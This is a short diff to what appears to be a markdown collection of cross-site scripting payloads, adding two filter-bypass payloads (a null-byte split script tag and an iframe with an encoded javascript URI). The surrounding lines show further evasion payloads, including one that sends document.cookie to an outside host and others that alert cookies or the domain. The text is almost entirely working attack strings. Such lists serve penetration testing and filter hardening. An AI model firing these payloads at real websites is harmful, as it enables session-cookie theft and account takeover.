@@ -113,6 +113,8 @@ java%0dscrip%0d%1b%1bt:console.log`${document.cookie}`}
 java%0dscrip%0d%1b%1bt:console.log`${location=`https://www.pudim. com?c=${document.cookie}`}
 "><x onauxclick=a=alert,a(domain)>click
 <!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+<sc%00ript>confirm(1)</script>
+\"><iframe/src=javascript:alert%26%23x000000028%3b)>
 ```
 
 ## XSS + SSRF <br>
